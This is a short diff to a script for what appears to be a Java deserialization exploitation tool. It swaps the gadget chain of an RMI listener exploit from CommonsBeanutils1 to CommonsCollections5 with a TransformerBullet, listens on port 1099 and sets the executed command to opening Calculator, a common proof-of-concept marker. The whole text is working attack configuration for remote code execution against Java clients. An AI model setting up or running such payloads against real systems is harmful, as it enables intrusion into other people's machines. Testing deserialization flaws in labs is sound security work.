@@ -1,6 +1,10 @@
 use exploit RMIListener
-use payload CommonsBeanutils1
-use bullet TemplatesImplBullet
+#use payload CommonsBeanutils1
+#use bullet TemplatesImplBullet
+
+use payload CommonsCollections5
+use bullet TransformerBullet
 set lport 1099
-set body "open -a Calculator"
+#set body "open -a Calculator.app"
+set command "open -a Calculator.app"
 run
